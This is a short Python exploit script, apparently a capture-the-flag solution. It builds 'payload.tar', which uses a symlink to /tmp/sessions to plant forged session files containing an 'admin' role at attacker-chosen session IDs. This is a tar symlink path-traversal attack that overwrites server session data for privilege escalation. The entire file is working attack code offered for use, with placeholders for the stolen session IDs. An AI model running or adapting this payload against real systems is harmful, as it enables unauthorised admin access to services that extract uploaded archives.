from tarfile import TarFile
import subprocess
import json
import os

USERNAME = "noexist"
# IDs generated from get_session_id.py
SESSION_ID_1 = "Past_Your_Generated Session_id_1 there"
SESSION_ID_2 = "Past_Your_Generated Session_id_2 there"
SESSION_ID_3 = "Past_Your_Generated Session_id_3 there"
#Create symlink locally
if os.path.exists("tmp_link"):
    os.remove("tmp_link")
subprocess.run(["ln", "-s", "/tmp/sessions", "tmp_link"])

data = json.dumps({"username":USERNAME, "id":1337,  "role":"admin"})
f = open(f"malicous_data.txt", "w")
f.write(data)
f.close()

with TarFile("payload.tar", "w") as tarf:
    tarf.add("tmp_link")
    # We add the file *inside* the symlinked directory structure
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_1}")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_2}")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_3}")

print("payload.tar created successfully.")
